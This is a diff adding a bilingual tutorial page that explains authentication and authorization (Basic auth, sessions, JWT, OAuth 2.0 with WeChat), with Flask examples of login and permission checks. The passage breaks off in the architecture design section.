@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<html lang="id" data-lang="id" data-theme="dark">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Principles of Authentication and Authorization — VibeKoding 📚</title>
+<meta name="description" content="Ensiklopedia VibeKoding: Principles of Authentication and Authorization. - Kurikulum VibeKoding dual bahasa ID/EN."/>
+
+<link rel="icon" type="image/svg+xml" href="../../../assets/favicon.svg"/>
+<meta name="theme-color" content="#07070f"/>
+<link rel="canonical" href="https://arifwidiyanto.web.id/vibekoding/appendix/4-server-and-backend/auth-authorization/"/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="../../../assets/vibekoding.css"/>
+</head>
+<body>
+<div class="aurora"><div class="blob b1"></div><div class="blob b2"></div><div class="blob b3"></div></div>
+<div class="grain"></div>
+<div id="scroll-progress"></div>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a class="brand" href="../../../"><span class="logo">🤖</span>Vibe<span class="grad-text">Koding</span></a>
+    <div class="nav-links">
+      <a href="../../../stage-1/"><span lang="id">🎒 Pemula</span><span lang="en">🎒 Beginner</span></a>
+      <a href="../../../stage-2/"><span lang="id">⚡ Developer</span><span lang="en">⚡ Developer</span></a>
+      <a href="../../../stage-3/"><span lang="id">🧙 Master</span><span lang="en">🧙 Master</span></a>
+      <a href="../../../appendix/"><span lang="id">📚 Ensiklopedia</span><span lang="en">📚 Encyclopedia</span></a>
+      <a href="../../../stories/" class="hide-sm"><span lang="id">✨ Cerita</span><span lang="en">✨ Stories</span></a>
+    </div>
+    <div class="nav-cta">
+      <button class="icon-btn lang-btn" data-lang="id" title="Bahasa Indonesia">ID</button>
+      <button class="icon-btn lang-btn" data-lang="en" title="English">EN</button>
+      <button class="icon-btn" id="theme-toggle" title="Toggle theme">☀️</button>
+    </div>
+  </div>
+</nav>
+
+<section class="lesson-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="../../../">VibeKoding</a> / <a href="../../../appendix/"><span lang="id">Ensiklopedia · Fondasi Kuat</span><span lang="en">Ensiklopedia · Fondasi Kuat</span></a> / <span lang="id">Principles of Authentication and Authorization</span><span lang="en">Principles of Authentication and Authorization</span></div>
+    <div class="lesson-head">
+      <div class="lesson-mascot">📚</div>
+      <div>
+        <h1><span lang="id">Principles of Authentication and Authorization</span><span lang="en">Principles of Authentication and Authorization</span></h1>
+        <div class="meta-row">
+          <span class="meta-chip">📚 <span lang="id">Ensiklopedia · Fondasi Kuat</span><span lang="en">Ensiklopedia · Fondasi Kuat</span></span>
+          <span class="meta-chip">🌏 <span>Dual Bahasa (ID / EN)</span></span>
+          <span class="meta-chip">⚡ <span>VibeKoding Native</span></span>
+        </div>
+      </div>
+    </div>
+    <p style="max-width:760px;margin-top:24px"><span lang="id">Ensiklopedia VibeKoding: Principles of Authentication and Authorization.</span><span lang="en">Ensiklopedia VibeKoding: Principles of Authentication and Authorization.</span></p>
+  </div>
+</section>
+
+<section style="padding-top:10px">
+  <div class="wrap prose">
+    <p class="reveal"><span lang="id">> 💡 <b>Learning Guide</b>: This chapter takes you deep into the "access control system" of backend architecture — authentication and authorization. We'll start from the most basic "who are you" and progressively master modern authentication schemes like Session, JWT, OAuth 2.0, and more.</span><span lang="en">> 💡 <b>Learning Guide</b>: This chapter takes you deep into the "access control system" of backend architecture — authentication and authorization. We'll start from the most basic "who are you" and progressively master modern authentication schemes like Session, JWT, OAuth 2.0, and more.</span></p>
+<p class="reveal"><span lang="id"><AuthEvolutionDemo /></span><span lang="en"><AuthEvolutionDemo /></span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">0. Introduction: The System's "Gatekeeper"</span><span lang="en">0. Introduction: The System's "Gatekeeper"</span></h2>
+<p class="reveal"><span lang="id">Why does WeChat still know who you are when you close and reopen the app?</span><span lang="en">Why does WeChat still know who you are when you close and reopen the app?</span></p>
+<p class="reveal"><span lang="id">How does Bilibili know if you're a premium member or a regular user?</span><span lang="en">How does Bilibili know if you're a premium member or a regular user?</span></p>
+<p class="reveal"><span lang="id">Why can you log into third-party websites by scanning a QR code with WeChat, without entering a password?</span><span lang="en">Why can you log into third-party websites by scanning a QR code with WeChat, without entering a password?</span></p>
+<p class="reveal"><span lang="id">Behind all of these lies one core system: <b>Authentication & Authorization</b>.</span><span lang="en">Behind all of these lies one core system: <b>Authentication & Authorization</b>.</span></p>
+<p class="reveal"><span lang="id">If we compare a backend system to an office building:</span><span lang="en">If we compare a backend system to an office building:</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Authentication</b>: Confirms "who you are" (verifying an ID badge / access card).</span><span lang="en"><b>Authentication</b>: Confirms "who you are" (verifying an ID badge / access card).</span></li>
+<li><span lang="id"><b>Authorization</b>: Confirms "where you can go" (VIPs can enter the VIP lounge; regular users cannot).</span><span lang="en"><b>Authorization</b>: Confirms "where you can go" (VIPs can enter the VIP lounge; regular users cannot).</span></li>
+</ul>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">0.1 Motivation for needing Authentication</span><span lang="en">0.1 Motivation for needing Authentication</span></h3>
+<p class="reveal"><span lang="id">There's only one reason: <b>to protect resources</b>.</span><span lang="en">There's only one reason: <b>to protect resources</b>.</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Privacy Protection</b>: Your personal information and chat history — only you can see them.</span><span lang="en"><b>Privacy Protection</b>: Your personal information and chat history — only you can see them.</span></li>
+<li><span lang="id"><b>Permission Control</b>: An admin can delete users; a regular user cannot.</span><span lang="en"><b>Permission Control</b>: An admin can delete users; a regular user cannot.</span></li>
+<li><span lang="id"><b>Abuse Prevention</b>: Prevents malicious API calls and brute-forcing of endpoints.</span><span lang="en"><b>Abuse Prevention</b>: Prevents malicious API calls and brute-forcing of endpoints.</span></li>
+</ul>
+<p class="reveal"><span lang="id"><AuthBasicsDemo /></span><span lang="en"><AuthBasicsDemo /></span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">0.2 Interactive Demo: Login Flow</span><span lang="en">0.2 Interactive Demo: Login Flow</span></h3>
+<p class="reveal"><span lang="id">Let's understand how authentication and authorization work through a real login demonstration.</span><span lang="en">Let's understand how authentication and authorization work through a real login demonstration.</span></p>
+<p class="reveal"><span lang="id"><AuthInteractiveLoginDemo /></span><span lang="en"><AuthInteractiveLoginDemo /></span></p>
+<p class="reveal"><span lang="id"><b>Key Point</b>: Authentication is the first line of defense — every sensitive operation must first verify identity.</span><span lang="en"><b>Key Point</b>: Authentication is the first line of defense — every sensitive operation must first verify identity.</span></p>
+<p class="reveal"><span lang="id">---</span><span lang="en">---</span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">1. Core Concepts: Authentication vs Authorization</span><span lang="en">1. Core Concepts: Authentication vs Authorization</span></h2>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">1.1 Authentication: Who Overview of You</span><span lang="en">1.1 Authentication: Who Overview of You</span></h3>
+<p class="reveal"><span lang="id">Confirms a user's identity.</span><span lang="en">Confirms a user's identity.</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><i>Example</i>: Entering a username and password, fingerprint scanning, facial recognition.</span><span lang="en"><i>Example</i>: Entering a username and password, fingerprint scanning, facial recognition.</span></li>
+<li><span lang="id"><i>Output</i>: A token that represents "you."</span><span lang="en"><i>Output</i>: A token that represents "you."</span></li>
+<li><span lang="id"><i>Abbreviation</i>: <b>AuthN</b></span><span lang="en"><i>Abbreviation</i>: <b>AuthN</b></span></li>
+</ul>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">1.2 Authorization: What Can You Do</span><span lang="en">1.2 Authorization: What Can You Do</span></h3>
+<p class="reveal"><span lang="id">Confirms what permissions a user has.</span><span lang="en">Confirms what permissions a user has.</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><i>Example</i>: An admin can delete posts; a regular user can only like them.</span><span lang="en"><i>Example</i>: An admin can delete posts; a regular user can only like them.</span></li>
+<li><span lang="id"><i>Output</i>: Allow or deny access.</span><span lang="en"><i>Output</i>: Allow or deny access.</span></li>
+<li><span lang="id"><i>Abbreviation</i>: <b>AuthZ</b></span><span lang="en"><i>Abbreviation</i>: <b>AuthZ</b></span></li>
+</ul>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">1.3 The Relationship Between the Two</span><span lang="en">1.3 The Relationship Between the Two</span></h3>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>CODE</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>User Request → Authentication (Who are you?) → Authorization (Can you do this?) → Execute Business Logic
+               ↓                                  ↓
+          Verify identity                   Check permissions
+          (Is the Token valid?)             (Does the user have delete permission?)</pre>
+</div>
+<p class="reveal"><span lang="id"><AuthNvsAuthZDemo /></span><span lang="en"><AuthNvsAuthZDemo /></span></p>
+<p class="reveal"><span lang="id"><b>Key Point</b>: Authenticate first, then authorize. Only after confirming "who you are" can you determine "what you can do."</span><span lang="en"><b>Key Point</b>: Authenticate first, then authorize. Only after confirming "who you are" can you determine "what you can do."</span></p>
+<p class="reveal"><span lang="id">---</span><span lang="en">---</span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">2. Evolution of Authentication Schemes</span><span lang="en">2. Evolution of Authentication Schemes</span></h2>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">2.1 First Generation: HTTP Basic Authentication</span><span lang="en">2.1 First Generation: HTTP Basic Authentication</span></h3>
+<p class="reveal"><span lang="id">The oldest approach — directly placing the username and password in the HTTP header.</span><span lang="en">The oldest approach — directly placing the username and password in the HTTP header.</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>http</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>GET /api/user/profile HTTP/1.1
+Host: example.com
+Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
+                      (base64(&quot;username:password&quot;))</pre>
+</div>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Pros</b>: Simple; supported by all browsers.</span><span lang="en"><b>Pros</b>: Simple; supported by all browsers.</span></li>
+<li><span lang="id"><b>Cons</b>:</span><span lang="en"><b>Cons</b>:</span></li>
+<li><span lang="id">Insecure (Base64 is decodable — effectively plaintext).</span><span lang="en">Insecure (Base64 is decodable — effectively plaintext).</span></li>
+<li><span lang="id">Password must be sent with every request (easy to intercept).</span><span lang="en">Password must be sent with every request (easy to intercept).</span></li>
+<li><span lang="id">Cannot proactively log out (unless you close the browser).</span><span lang="en">Cannot proactively log out (unless you close the browser).</span></li>
+</ul>
+<p class="reveal"><span lang="id"><b>Verdict</b>: Only suitable for internal testing tools; never use in production.</span><span lang="en"><b>Verdict</b>: Only suitable for internal testing tools; never use in production.</span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">2.2 Second Generation: Session + Cookie</span><span lang="en">2.2 Second Generation: Session + Cookie</span></h3>
+<p class="reveal"><span lang="id">The classic approach for web development.</span><span lang="en">The classic approach for web development.</span></p>
+<p class="reveal"><span lang="id"><b>Flow</b>:</span><span lang="en"><b>Flow</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>CODE</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>1. User logs in (POST /login)
+   → Server validates username and password
+   → Creates a Session (in server memory or Redis)
+   → Returns Set-Cookie: session_id=abc123
+
+2. Subsequent requests
+   → Browser automatically sends Cookie: session_id=abc123
+   → Server looks up Session by session_id
+   → If found, the user is considered &quot;who they claim to be&quot;</pre>
+</div>
+<p class="reveal"><span lang="id"><b>Code Example</b>:</span><span lang="en"><b>Code Example</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre># Backend (Python Flask)
+from flask import session, request
+
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.json[&quot;username&quot;]
+    password = request.json[&quot;password&quot;]
+
+    # Verify username and password
+    user = db.authenticate(username, password)
+    if user:
+        # Create Session
+        session[&quot;user_id&quot;] = user.id
+        session[&quot;role&quot;] = user.role
+        return {&quot;status&quot;: &quot;success&quot;}
+    else:
+        return {&quot;error&quot;: &quot;Incorrect username or password&quot;}, 401
+
+@app.route(&quot;/api/admin/users&quot;)
+def get_users():
+    # Check Session
+    if &quot;user_id&quot; not in session:
+        return {&quot;error&quot;: &quot;Not logged in&quot;}, 401
+
+    # Check permissions
+    if session.get(&quot;role&quot;) != &quot;admin&quot;:
+        return {&quot;error&quot;: &quot;Insufficient permissions&quot;}, 403
+
+    # Execute business logic
+    users = db.get_all_users()
+    return {&quot;users&quot;: users}</pre>
+</div>
+<p class="reveal"><span lang="id"><SessionCookieDemo /></span><span lang="en"><SessionCookieDemo /></span></p>
+<p class="reveal"><span lang="id"><b>Pros</b>:</span><span lang="en"><b>Pros</b>:</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id">Simple and intuitive; easy to understand.</span><span lang="en">Simple and intuitive; easy to understand.</span></li>
+<li><span lang="id">Server can proactively log out (delete the Session).</span><span lang="en">Server can proactively log out (delete the Session).</span></li>
+</ul>
+<p class="reveal"><span lang="id"><b>Cons</b>:</span><span lang="en"><b>Cons</b>:</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Server is stateful</b>: Needs to store Sessions; multiple servers require shared storage (e.g., Redis).</span><span lang="en"><b>Server is stateful</b>: Needs to store Sessions; multiple servers require shared storage (e.g., Redis).</span></li>
+<li><span lang="id"><b>Cross-origin difficulties</b>: Cookies are not cross-origin by default (CORS issues).</span><span lang="en"><b>Cross-origin difficulties</b>: Cookies are not cross-origin by default (CORS issues).</span></li>
+<li><span lang="id"><b>CSRF attacks</b>: Malicious websites can impersonate your Cookie.</span><span lang="en"><b>CSRF attacks</b>: Malicious websites can impersonate your Cookie.</span></li>
+</ul>
+<p class="reveal"><span lang="id"><b>Verdict</b>: Suitable for traditional web applications (server-side rendering); not suitable for mobile or modern SPAs.</span><span lang="en"><b>Verdict</b>: Suitable for traditional web applications (server-side rendering); not suitable for mobile or modern SPAs.</span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">2.3 Third Generation: Token (JWT)</span><span lang="en">2.3 Third Generation: Token (JWT)</span></h3>
+<p class="reveal"><span lang="id">The mainstream approach for modern web applications.</span><span lang="en">The mainstream approach for modern web applications.</span></p>
+<p class="reveal"><span lang="id"><b>Core Idea</b>: Don't store state on the server. Encrypt user information into a Token and store it on the client.</span><span lang="en"><b>Core Idea</b>: Don't store state on the server. Encrypt user information into a Token and store it on the client.</span></p>
+<p class="reveal"><span lang="id"><b>JWT Structure</b>:</span><span lang="en"><b>JWT Structure</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>CODE</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>JWT = Header.Payload.Signature
+
+Example:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+ |--------------------------------| |-----------------------------------------------| |----------------------------|
+           Header                           Payload                                      Signature</pre>
+</div>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Header</b>: Algorithm information (e.g., <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">{"alg": "HS256", "typ": "JWT"}</code>).</span><span lang="en"><b>Header</b>: Algorithm information (e.g., <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">{"alg": "HS256", "typ": "JWT"}</code>).</span></li>
+<li><span lang="id"><b>Payload</b>: User information (e.g., <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">{"user_id": 123, "role": "admin", "exp": 1616239022}</code>).</span><span lang="en"><b>Payload</b>: User information (e.g., <code style="font-family:var(--font-mono);background:var(--panel-strong);padding:2px 7px;border-radius:6px">{"user_id": 123, "role": "admin", "exp": 1616239022}</code>).</span></li>
+<li><span lang="id"><b>Signature</b>: Tamper-proof signature.</span><span lang="en"><b>Signature</b>: Tamper-proof signature.</span></li>
+</ul>
+<p class="reveal"><span lang="id"><b>Flow</b>:</span><span lang="en"><b>Flow</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre># 1. User login
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    username = request.json[&quot;username&quot;]
+    password = request.json[&quot;password&quot;]
+
+    user = db.authenticate(username, password)
+    if user:
+        # Generate JWT
+        token = jwt.encode(
+            {
+                &quot;user_id&quot;: user.id,
+                &quot;role&quot;: user.role,
+                &quot;exp&quot;: datetime.now() + timedelta(hours=24)  # Expires in 24 hours
+            },
+            SECRET_KEY,
+            algorithm=&quot;HS256&quot;
+        )
+        return {&quot;token&quot;: token}
+    else:
+        return {&quot;error&quot;: &quot;Incorrect username or password&quot;}, 401
+
+# 2. Subsequent requests
+@app.route(&quot;/api/admin/users&quot;)
+def get_users():
+    # Get Token from Header
+    auth_header = request.headers.get(&quot;Authorization&quot;)
+    if not auth_header or not auth_header.startswith(&quot;Bearer &quot;):
+        return {&quot;error&quot;: &quot;No Token provided&quot;}, 401
+
+    token = auth_header.split(&quot; &quot;)[1]
+
+    try:
+        # Verify and parse Token
+        payload = jwt.decode(token, SECRET_KEY, algorithms=[&quot;HS256&quot;])
+    except jwt.ExpiredSignatureError:
+        return {&quot;error&quot;: &quot;Token has expired&quot;}, 401
+    except jwt.InvalidTokenError:
+        return {&quot;error&quot;: &quot;Token is invalid&quot;}, 401
+
+    # Check permissions
+    if payload.get(&quot;role&quot;) != &quot;admin&quot;:
+        return {&quot;error&quot;: &quot;Insufficient permissions&quot;}, 403
+
+    # Execute business logic
+    users = db.get_all_users()
+    return {&quot;users&quot;: users}</pre>
+</div>
+<p class="reveal"><span lang="id"><JWTWorkflowDemo /></span><span lang="en"><JWTWorkflowDemo /></span></p>
+<p class="reveal"><span lang="id"><b>Pros</b>:</span><span lang="en"><b>Pros</b>:</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Stateless</b>: No Session storage on the server; easy to scale horizontally.</span><span lang="en"><b>Stateless</b>: No Session storage on the server; easy to scale horizontally.</span></li>
+<li><span lang="id"><b>Cross-origin friendly</b>: Stored in a Header, not subject to Cookie cross-origin restrictions.</span><span lang="en"><b>Cross-origin friendly</b>: Stored in a Header, not subject to Cookie cross-origin restrictions.</span></li>
+<li><span lang="id"><b>Mobile friendly</b>: Native apps can easily use it as well.</span><span lang="en"><b>Mobile friendly</b>: Native apps can easily use it as well.</span></li>
+<li><span lang="id"><b>Rich information</b>: The Payload can store user information, permissions, etc.</span><span lang="en"><b>Rich information</b>: The Payload can store user information, permissions, etc.</span></li>
+</ul>
+<p class="reveal"><span lang="id"><b>Cons</b>:</span><span lang="en"><b>Cons</b>:</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Cannot proactively log out</b>: Once issued, a Token remains valid until it expires (unless using a blocklist).</span><span lang="en"><b>Cannot proactively log out</b>: Once issued, a Token remains valid until it expires (unless using a blocklist).</span></li>
+<li><span lang="id"><b>Payload is visible</b>: Base64-encoded — do not store sensitive information (e.g., passwords).</span><span lang="en"><b>Payload is visible</b>: Base64-encoded — do not store sensitive information (e.g., passwords).</span></li>
+<li><span lang="id"><b>Large Token size</b>: Must be sent with every request — several hundred bytes.</span><span lang="en"><b>Large Token size</b>: Must be sent with every request — several hundred bytes.</span></li>
+</ul>
+<p class="reveal"><span lang="id"><b>Verdict</b>: The standard approach for modern web and mobile applications.</span><span lang="en"><b>Verdict</b>: The standard approach for modern web and mobile applications.</span></p>
+<p class="reveal"><span lang="id"><SessionVsJWTDemo /></span><span lang="en"><SessionVsJWTDemo /></span></p>
+<p class="reveal"><span lang="id">---</span><span lang="en">---</span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">3. OAuth 2.0: Third-Party Login</span><span lang="en">3. OAuth 2.0: Third-Party Login</span></h2>
+<p class="reveal"><span lang="id">You've definitely seen these buttons: "Log in with WeChat," "Log in with Google."</span><span lang="en">You've definitely seen these buttons: "Log in with WeChat," "Log in with Google."</span></p>
+<p class="reveal"><span lang="id">This is <b>OAuth 2.0</b>: an <b>authorization</b> framework (not authentication!).</span><span lang="en">This is <b>OAuth 2.0</b>: an <b>authorization</b> framework (not authentication!).</span></p>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">3.1 Core Roles</span><span lang="en">3.1 Core Roles</span></h3>
+<div class="table-wrap reveal" style="overflow-x:auto;margin:20px 0"><table>
+<tr><th>Role</th><th>Description</th><th>Example</th></tr>
+<tr><td><b>Resource Owner</b></td><td>The owner of the resources (user)</td><td>You</td></tr>
+<tr><td><b>Client</b></td><td>The third-party application</td><td>Some website</td></tr>
+<tr><td><b>Authorization Server</b></td><td>The authorization server</td><td>WeChat, Google</td></tr>
+<tr><td><b>Resource Server</b></td><td>The resource server</td><td>WeChat's user information API</td></tr>
+</table></div>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">3.2 Authorization Code Flow</span><span lang="en">3.2 Authorization Code Flow</span></h3>
+<p class="reveal"><span lang="id">The most secure mode — suitable for servers with a backend.</span><span lang="en">The most secure mode — suitable for servers with a backend.</span></p>
+<p class="reveal"><span lang="id"><b>Flow</b>:</span><span lang="en"><b>Flow</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>CODE</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>1. User clicks &quot;Log in with WeChat&quot;
+   → Redirects to the WeChat authorization page
+   https://open.weixin.qq.com/connect/qrconnect?
+     appid=APPID&amp;
+     redirect_uri=https://yourapp.com/callback&amp;
+     response_type=code&amp;
+     scope=snsapi_login&amp;
+     state=STATE
+
+2. User scans the QR code and grants authorization
+   → WeChat redirects back to your website
+   https://yourapp.com/callback?code=AUTHORIZATION_CODE&amp;state=STATE
+
+3. Your backend exchanges the code for an access_token
+   POST https://api.weixin.qq.com/sns/oauth2/access_token
+   {
+     &quot;appid&quot;: &quot;APPID&quot;,
+     &quot;secret&quot;: &quot;SECRET&quot;,
+     &quot;code&quot;: &quot;AUTHORIZATION_CODE&quot;,
+     &quot;grant_type&quot;: &quot;authorization_code&quot;
+   }
+   → Returns: { &quot;access_token&quot;: &quot;...&quot;, &quot;openid&quot;: &quot;...&quot; }
+
+4. Use the access_token to fetch user information
+   GET https://api.weixin.qq.com/sns/userinfo?
+     access_token=ACCESS_TOKEN&amp;
+     openid=OPENID
+   → Returns: { &quot;nickname&quot;: &quot;Zhang San&quot;, &quot;headimgurl&quot;: &quot;...&quot; }</pre>
+</div>
+<p class="reveal"><span lang="id"><OAuth2FlowDemo /></span><span lang="en"><OAuth2FlowDemo /></span></p>
+<p class="reveal"><span lang="id"><b>Code Example</b>:</span><span lang="en"><b>Code Example</b>:</span></p>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>python</code></b>
+    <button class="copy-btn"><span lang="id">📋 Salin</span><span lang="en">📋 Copy</span></button>
+  </div>
+  <pre>from flask import request, redirect
+
+@app.route(&quot;/login/wechat&quot;)
+def login_wechat():
+    # 1. Redirect to WeChat authorization page
+    auth_url = (
+        &quot;https://open.weixin.qq.com/connect/qrconnect&quot;
+        f&quot;?appid={APPID}&quot;
+        f&quot;&amp;redirect_uri={urlencode(REDIRECT_URI)}&quot;
+        &quot;&amp;response_type=code&quot;
+        &quot;&amp;scope=snsapi_login&quot;
+        f&quot;&amp;state={generate_state()}&quot;
+    )
+    return redirect(auth_url)
+
+@app.route(&quot;/callback&quot;)
+def wechat_callback():
+    # 2. Get the code
+    code = request.args.get(&quot;code&quot;)
+    state = request.args.get(&quot;state&quot;)
+
+    # Verify state (anti-CSRF)
+    if not verify_state(state):
+        return {&quot;error&quot;: &quot;Invalid state&quot;}, 400
+
+    # 3. Exchange the code for an access_token
+    token_resp = requests.post(
+        &quot;https://api.weixin.qq.com/sns/oauth2/access_token&quot;,
+        params={
+            &quot;appid&quot;: APPID,
+            &quot;secret&quot;: SECRET,
+            &quot;code&quot;: code,
+            &quot;grant_type&quot;: &quot;authorization_code&quot;
+        }
+    ).json()
+
+    access_token = token_resp[&quot;access_token&quot;]
+    openid = token_resp[&quot;openid&quot;]
+
+    # 4. Fetch user information
+    user_info = requests.get(
+        &quot;https://api.weixin.qq.com/sns/userinfo&quot;,
+        params={
+            &quot;access_token&quot;: access_token,
+            &quot;openid&quot;: openid
+        }
+    ).json()
+
+    # 5. Create or update local user
+    user = db.get_or_create_user(
+        openid=openid,
+        nickname=user_info[&quot;nickname&quot;],
+        avatar=user_info[&quot;headimgurl&quot;]
+    )
+
+    # 6. Generate this system&#039;s JWT
+    token = jwt.encode(
+        {&quot;user_id&quot;: user.id, &quot;exp&quot;: ...},
+        SECRET_KEY
+    )
+
+    return {&quot;token&quot;: token}</pre>
+</div>
+<p class="reveal"><span lang="id"><b>Key Points</b>:</span><span lang="en"><b>Key Points</b>:</span></p>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>The code can only be used once</b>: It expires after use, preventing interception.</span><span lang="en"><b>The code can only be used once</b>: It expires after use, preventing interception.</span></li>
+<li><span lang="id"><b>state prevents CSRF</b>: Generate a random string; verify it on callback to prevent malicious spoofing.</span><span lang="en"><b>state prevents CSRF</b>: Generate a random string; verify it on callback to prevent malicious spoofing.</span></li>
+<li><span lang="id"><b>redirect_uri must match</b>: Register it in advance on the WeChat Open Platform to prevent redirect attacks.</span><span lang="en"><b>redirect_uri must match</b>: Register it in advance on the WeChat Open Platform to prevent redirect attacks.</span></li>
+</ul>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">3.3 Other Modes</span><span lang="en">3.3 Other Modes</span></h3>
+<div class="table-wrap reveal" style="overflow-x:auto;margin:20px 0"><table>
+<tr><th>Mode</th><th>Use Case</th><th>Security</th></tr>
+<tr><td><b>Authorization Code</b></td><td>Servers with a backend</td><td>⭐⭐⭐⭐⭐</td></tr>
+<tr><td><b>Implicit</b></td><td>Pure frontend apps (SPA)</td><td>⭐⭐⭐ (deprecated)</td></tr>
+<tr><td><b>Resource Owner Password</b></td><td>Highly trusted apps (e.g., official app)</td><td>⭐⭐</td></tr>
+<tr><td><b>Client Credentials</b></td><td>Server-to-server communication (no user)</td><td>⭐⭐⭐⭐</td></tr>
+</table></div>
+<p class="reveal"><span lang="id"><OAuth2ModesDemo /></span><span lang="en"><OAuth2ModesDemo /></span></p>
+<p class="reveal"><span lang="id">---</span><span lang="en">---</span></p>
+<h2 class="reveal" style="margin:36px 0 16px"><span lang="id">4. In Practice: Designing a Complete Authentication System</span><span lang="en">4. In Practice: Designing a Complete Authentication System</span></h2>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">4.1 Requirements Analysis</span><span lang="en">4.1 Requirements Analysis</span></h3>
+<ul class="reveal" style="margin:14px 0 20px 24px;line-height:1.8">
+<li><span lang="id"><b>Multi-platform support</b>: Web, iOS, Android.</span><span lang="en"><b>Multi-platform support</b>: Web, iOS, Android.</span></li>
+<li><span lang="id"><b>Third-party login</b>: WeChat, Google.</span><span lang="en"><b>Third-party login</b>: WeChat, Google.</span></li>
+<li><span lang="id"><b>Permission control</b>: Regular users, VIPs, admins.</span><span lang="en"><b>Permission control</b>: Regular users, VIPs, admins.</span></li>
+<li><span lang="id"><b>Security</b>: Anti-brute-force, anti-hijacking, anti-replay.</span><span lang="en"><b>Security</b>: Anti-brute-force, anti-hijacking, anti-replay.</span></li>
+</ul>
+<h3 class="reveal" style="margin:24px 0 12px;font-size:1.25rem"><span lang="id">4.2 Architecture Design</span><span lang="en">4.2 Architecture Design</span></h3>
+
+<div class="prompt-card reveal" style="margin:22px 0">
+  <div class="p-head">
+    <b><code>CODE</code></b>
